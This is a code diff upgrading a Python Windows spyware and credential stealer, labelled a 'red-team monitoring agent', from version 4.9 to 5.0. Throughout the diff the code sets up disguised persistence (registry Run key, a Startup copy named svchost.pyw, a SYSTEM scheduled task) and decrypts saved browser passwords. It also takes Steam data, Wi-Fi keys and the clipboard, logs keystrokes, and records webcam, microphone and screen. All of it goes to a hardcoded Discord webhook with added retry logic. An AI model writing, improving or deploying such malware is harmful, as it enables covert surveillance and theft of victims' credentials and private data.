@@ -1,5 +1,5 @@
 # =====================================================
-# ULTIMATE RED-TEAM MONITORING AGENT v4.9 - FULL COMPLETE
+# ULTIMATE RED-TEAM MONITORING AGENT v5.0 - FIXED & HARDENED
 # =====================================================
 import os
 import sys
@@ -36,12 +36,10 @@ except:
     CRYPTO_AVAILABLE = False
 
 # ================== CONFIG ==================
-CONFIG_FILE = "config.json"
 DEFAULT_WEBHOOK = "https://discord.com/api/webhooks/1504108072963014798/T6FC93tE6R8KYmeckjzuvsoTe_cdD6s8Acpo0IBgb6OqLvH54_1uBW9UKFdBPAZiAFx6"
 INTERVAL = 25
 SCREENSHOT_INTERVAL = 60
-RECORD_DURATION = 20
-
+RECORD_DURATION = 15
 LOG_FILE = os.path.join(os.getenv('APPDATA'), "WindowsUpdate.log")
 
 def log(msg):
@@ -54,7 +52,7 @@ def log(msg):
     except:
         pass
 
-log("=== AGENT v4.9 FULL STARTED ===")
+log("=== AGENT v5.0 FULL STARTED ===")
 
 # ================== BROWSER PATHS ==================
 BROWSER_PATHS = {
@@ -89,10 +87,8 @@ def add_persistence(script_path):
         reg_key = reg.OpenKey(key, r"Software\Microsoft\Windows\CurrentVersion\Run", 0, reg.KEY_SET_VALUE)
         reg.SetValueEx(reg_key, "WindowsUpdateSvc", 0, reg.REG_SZ, f'pythonw "{script_path}"')
         reg.CloseKey(reg_key)
-
         startup = os.path.join(os.getenv('APPDATA'), r"Microsoft\Windows\Start Menu\Programs\Startup")
         shutil.copy(script_path, os.path.join(startup, "svchost.pyw"))
-
         subprocess.run(f'schtasks /create /tn "WindowsUpdate" /tr "pythonw {script_path}" /sc onlogon /ru SYSTEM /f', shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
         log("Persistence added")
     except Exception as e:
@@ -120,14 +116,11 @@ def decrypt_password(encrypted, master_key):
             ciphertext = encrypted[15:]
             cipher = AES.new(master_key, AES.MODE_GCM, iv)
             decrypted = cipher.decrypt(ciphertext)[:-16].decode('utf-8', errors='ignore')
-            log("AES-GCM (v10/v11) DECRYPT SUCCESS")
             return decrypted
         else:
             decrypted = win32crypt.CryptUnprotectData(encrypted, None, None, None, 0)[1].decode('utf-8', errors='ignore')
-            log("DPAPI DECRYPT SUCCESS")
             return decrypted
-    except Exception as e:
-        log(f"Decryption failed: {type(e).__name__} - {e}")
+    except:
         return "DECRYPT_FAILED"
 
 # ================== STEAM STEALER ==================
@@ -161,13 +154,12 @@ def extract_browser_txt():
     for browser, base_path in BROWSER_PATHS.items():
         if not os.path.exists(base_path):
             continue
-        for profile in ["Default"] + [d for d in os.listdir(base_path) if d.startswith("Profile") or "default" in d][:3]:
-            profile_path = os.path.join(base_path, profile) if browser != "Firefox" else os.path.join(base_path, profile)
+        for profile in ["Default"] + [d for d in os.listdir(base_path) if d.startswith("Profile") or "default" in d.lower()][:3]:
+            profile_path = os.path.join(base_path, profile)
             if not os.path.exists(profile_path):
                 continue
-
-            local_state = os.path.join(base_path, "Local State")
-            master_key = get_master_key(local_state) if os.path.exists(local_state) else None
+            local_state = os.path.join(base_path, "Local State") if browser != "Firefox" else None
+            master_key = get_master_key(local_state) if local_state and os.path.exists(local_state) else None
 
             # PASSWORDS
             login_db = os.path.join(profile_path, "Login Data")
@@ -181,12 +173,11 @@ def extract_browser_txt():
                     for row in cursor.execute("SELECT origin_url, username_value, password_value FROM logins WHERE password_value IS NOT NULL"):
                         url, user, enc = row
                         plain = decrypt_password(enc, master_key)
-                        content += f"URL  : {url}\nUSER : {user}\nPASS : {plain}\n{'-'*90}\n"
+                        content += f"URL : {url}\nUSER : {user}\nPASS : {plain}\n{'-'*90}\n"
                         count += 1
                     conn.close()
                     os.remove("temp_login.db")
                     log(f"Extracted {count} passwords from {browser}/{profile}")
-
                     fname = f"{browser}_{profile}_PASSWORDS.txt"
                     with open(fname, "w", encoding="utf-8") as f:
                         f.write(content)
@@ -195,7 +186,6 @@ def extract_browser_txt():
                     os.remove(fname)
                 except Exception as e:
                     log(f"Password extraction error {browser}: {e}")
-
     return txt_files
 
 # ================== OTHER MODULES ==================
@@ -273,7 +263,8 @@ def capture_webcam_and_mic():
             wf.setsampwidth(2)
             wf.setframerate(fs)
             wf.writeframes(recording.tobytes())
-        files["mic.wav"] = ("mic.wav", open("mic.wav", "rb").read(), "audio/wav")
+        with open("mic.wav", "rb") as f:
+            files["mic.wav"] = ("mic.wav", f.read(), "audio/wav")
         os.remove("mic.wav")
     except:
         pass
@@ -286,9 +277,9 @@ def capture_screen_record():
             img = pyautogui.screenshot()
             frame = cv2.cvtColor(np.array(img), cv2.COLOR_RGB2BGR)
             frames.append(frame)
-            time.sleep(1/15)
+            time.sleep(1/12)
         height, width = frames[0].shape[:2]
-        out = cv2.VideoWriter("screen.mp4", cv2.VideoWriter_fourcc(*'mp4v'), 15, (width, height))
+        out = cv2.VideoWriter("screen.mp4", cv2.VideoWriter_fourcc(*'mp4v'), 12, (width, height))
         for f in frames:
             out.write(f)
         out.release()
@@ -296,33 +287,38 @@ def capture_screen_record():
             data = f.read()
         os.remove("screen.mp4")
         return {"screen.mp4": ("screen.mp4", data, "video/mp4")}
-    except:
+    except Exception as e:
+        log(f"Screen record failed: {e}")
         return {}
 
-def send_to_webhook(payload, files=None):
-    try:
-        r = requests.post(DEFAULT_WEBHOOK, json=payload, files=files, timeout=20)
-        log(f"Webhook status: {r.status_code if r else 'fail'}")
-        return r.status_code
-    except Exception as e:
-        log(f"WEBHOOK FAILED: {type(e).__name__} - {e}")
-        return None
+def send_to_webhook(payload, files=None, max_retries=3):
+    for attempt in range(max_retries):
+        try:
+            if len(json.dumps(payload)) > 1900:
+                payload["content"] = payload["content"][:1850] + "\n...[truncated]"
+            r = requests.post(DEFAULT_WEBHOOK, json=payload, files=files, timeout=25)
+            log(f"Webhook attempt {attempt+1} status: {r.status_code}")
+            if r.status_code in (200, 204):
+                return True
+            elif r.status_code == 429:
+                time.sleep(8 * (attempt + 1))
+        except Exception as e:
+            log(f"Webhook error attempt {attempt+1}: {type(e).__name__} - {e}")
+            time.sleep(4)
+    return False
 
 # ================== MAIN LOOP ==================
 def main_loop(script_path):
     log("Main loop started")
     add_persistence(script_path)
     stealth_mode()
-
-    # FORCED INITIAL PING
-    send_to_webhook({"content": "**AGENT v4.9 INITIAL PING - ALIVE & RUNNING**"})
-
+    send_to_webhook({"content": "**AGENT v5.0 INITIAL PING - ALIVE & RUNNING**"})
     start_keylogger()
-
     ss_count = 0
     while True:
         try:
-            info = get_system_info()
+            vm_detected, _ = detect_vm()
+            info = get_system_info(vm_detected)
             info["clipboard"] = get_clipboard()
             info["wifi"] = get_wifi_passwords()
             info["steam"] = steal_steam_data()
@@ -331,7 +327,9 @@ def main_loop(script_path):
 
             txt_attachments = extract_browser_txt()
 
-            payload = {"content": "**AGENT v4.9 REPORT**```json\n" + json.dumps(info, default=str, indent=2)[:1900] + "\n```"}
+            payload = {
+                "content": f"**AGENT v5.0 REPORT** | {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n```json\n{json.dumps(info, default=str, indent=2)[:1850]}\n```"
+            }
 
             files = txt_attachments.copy()
 
@@ -339,16 +337,22 @@ def main_loop(script_path):
                 try:
                     shot = pyautogui.screenshot()
                     shot.save("screen.png")
-                    files["screen.png"] = ("screen.png", open("screen.png","rb").read(), "image/png")
+                    with open("screen.png", "rb") as f:
+                        files["screen.png"] = ("screen.png", f.read(), "image/png")
                     os.remove("screen.png")
                 except:
                     pass
 
-            if ss_count % 5 == 0:
+            if ss_count % 6 == 0:
                 files.update(capture_webcam_and_mic())
                 files.update(capture_screen_record())
 
-            send_to_webhook(payload, files)
+            success = send_to_webhook(payload, files)
+            if success:
+                log("Exfil successful")
+            else:
+                log("Exfil failed after retries")
+
             ss_count += 1
             time.sleep(INTERVAL)
         except Exception as e:
@@ -361,6 +365,6 @@ if __name__ == "__main__":
     script_path = os.path.abspath(sys.argv[0])
     log("Launching main thread")
     threading.Thread(target=main_loop, args=(script_path,), daemon=False).start()
-    log("Agent fully started - check Discord + log file")
+    log("Agent v5.0 fully started - check Discord + log file")
     while True:
         time.sleep(3600)
